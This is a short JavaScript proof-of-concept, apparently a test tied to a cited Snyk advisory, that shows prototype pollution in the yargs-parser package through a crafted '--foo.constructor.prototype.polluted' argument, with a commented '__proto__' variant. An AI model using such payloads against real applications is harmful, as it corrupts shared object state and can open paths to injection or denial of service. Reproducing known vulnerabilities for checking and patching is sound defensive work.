// //https://snyk.io/vuln/SNYK-JS-YARGSPARSER-560381

// test("prototype pollution in yargs-parser", () => {
console.log({}.polluted);

  const parser = require("yargs-parser");

  parser("--foo.constructor.prototype.polluted yes");
  //parser("--foo.__proto__.polluted yes");

console.log({}.polluted);
// });
